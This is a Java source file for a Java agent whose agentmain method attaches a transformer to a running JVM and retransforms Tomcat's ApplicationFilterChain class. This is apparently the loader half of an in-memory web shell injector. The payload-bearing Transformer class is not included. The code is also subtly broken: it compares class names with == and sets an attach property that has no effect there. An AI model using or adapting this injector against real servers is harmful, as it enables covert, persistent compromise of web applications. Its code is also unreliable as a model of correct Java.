import java.lang.instrument.Instrumentation;

public class AgentmainAgent {

    public static void agentmain(String agentArgs, Instrumentation ins) {
        System.setProperty("jdk.attach.allowAttachSelf", "true");
        try{
            ins.addTransformer(new Transformer(),true);
            Class<?>[] cLasses = ins.getAllLoadedClasses();
            for (Class cls : cLasses){
                String wantedClassName = "org.apache.catalina.core.ApplicationFilterChain";
                if (cls.getName() == wantedClassName){
                    ins.retransformClasses(cls);
                    break;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
